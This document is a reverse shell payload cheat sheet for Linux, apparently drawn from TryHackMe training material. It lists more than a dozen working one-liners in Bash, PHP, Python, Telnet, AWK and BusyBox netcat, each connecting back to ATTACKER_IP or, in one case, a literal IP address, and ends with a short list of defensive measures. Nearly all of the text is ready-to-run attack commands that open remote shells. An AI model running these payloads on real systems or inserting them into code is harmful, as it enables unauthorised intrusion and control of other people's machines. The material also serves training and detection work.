### Shell Payloads: Techniques for Exposing a Shell on a Linux OS

Shell payloads are commands or scripts that enable remote access by exposing a shell on the compromised machine. In the case of a **bind shell**, the target machine listens for an incoming connection, while a **reverse shell** initiates a connection to the attacker's system. Let's explore popular reverse shell payloads used in Linux, including implementations in Bash, PHP, Python, and other tools.

---

### Bash Reverse Shell Payloads

**1. Normal Bash Reverse Shell**
   ```bash
   target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
   ```
   - **Description**: This payload creates an interactive Bash shell that sends both standard output and standard error through a TCP connection to `ATTACKER_IP` on port `443`. This setup allows for a basic two-way communication channel.

**2. Bash Read Line Reverse Shell**
   ```bash
   target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
   ```
   - **Description**: Opens a new file descriptor (numbered `5`) connected to `ATTACKER_IP:443` and reads input from the attacker line-by-line, executing it and sending the output back through the same socket.

**3. Bash File Descriptor 196 Reverse Shell**
   ```bash
   target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
   ```
   - **Description**: Uses file descriptor `196` to set up a two-way communication channel over TCP. Commands are read from and sent to the attacker through the same connection.

**4. Bash File Descriptor 5 Reverse Shell**
   ```bash
   target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
   ```
   - **Description**: Creates an interactive Bash shell using file descriptor `5`, allowing bidirectional communication with the attacker.

---

### PHP Reverse Shell Payloads

PHP offers several functions to execute reverse shell payloads, primarily suited for web-based exploitation where PHP is supported.

**1. PHP exec Reverse Shell**
   ```php
   target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
   ```
   - **Description**: Opens a socket to `ATTACKER_IP:443` and uses the `exec` function to open a shell and redirect standard input/output to the socket.

**2. PHP shell_exec Reverse Shell**
   ```php
   target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
   ```
   - **Description**: Similar to `exec`, this payload uses `shell_exec` to execute a shell, redirecting input/output to the attacker's socket.

**3. PHP system Reverse Shell**
   ```php
   target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
   ```
   - **Description**: Uses the `system` function, executing commands and sending output directly back to the attacker.

**4. PHP passthru Reverse Shell**
   ```php
   target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
   ```
   - **Description**: The `passthru` function is effective for executing binary commands and handling raw output, which can be useful for specific tasks.

**5. PHP popen Reverse Shell**
   ```php
   target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
   ```
   - **Description**: Opens a process file pointer with `popen`, facilitating the execution of commands through the shell.

---

### Python Reverse Shell Payloads

Python is widely supported on Linux and provides multiple ways to create a reverse shell.

**1. Python Reverse Shell with Environment Variables**
   ```python
   target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
   ```
   - **Description**: Sets the attacker IP and port as environment variables, opens a socket, duplicates the file descriptors, and spawns a Bash shell for the connection.

**2. Python Reverse Shell Using subprocess**
   ```python
   target@tryhackme:~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
   ```
   - **Description**: Uses `subprocess` and `os` modules to spawn a Bash shell. It redirects the input/output/error streams to the attacker’s socket.

**3. Short Python Reverse Shell**
   ```python
   target@tryhackme:~$ python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
   ```
   - **Description**: A shorter payload that creates a reverse shell by redirecting standard input/output and spawning a shell.

---

### Other Reverse Shell Payloads

**1. Telnet Reverse Shell**
   ```bash
   target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
   ```
   - **Description**: Uses `mkfifo` to create a named pipe, then connects to `ATTACKER_IP` on port 443 via Telnet, allowing for a basic reverse shell.

**2. AWK Reverse Shell**
   ```awk
   target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
   ```
   - **Description**: Leverages AWK’s TCP capabilities to connect to the attacker and send/receive data over a TCP connection.

**3. BusyBox Reverse Shell**
   ```bash
   target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
   ```
   - **Description**: Uses BusyBox’s built-in Netcat (`nc`) functionality to connect to the attacker, executing `/bin/sh` upon connection.

---

### Summary and Security Implications

Each of these payloads opens a reverse shell by connecting to the attacker’s IP address and port, exposing the target system’s command line. The most commonly used ports are 443, 80, or other well-known ports to blend with legitimate traffic and evade detection by firewalls.

#### **Security Considerations**:
1. **Network Monitoring**: Implement Intrusion Detection Systems (IDS) to detect unusual outbound connections, especially to suspicious ports.
2. **Firewall Rules**: Restrict outbound connections on commonly abused ports, and apply strict egress filtering rules.
3. **Endpoint Protection**: Employ endpoint detection tools to monitor the execution of suspicious commands and payloads.
4. **User Awareness**: Educate users and administrators about common reverse shell payloads, especially when reviewing scripts and code on servers.

Understanding these payloads is essential for cybersecurity professionals to defend against them effectively. By recognizing the patterns and behavior of reverse shells, defenders can design better security strategies to detect and mitigate such attacks.
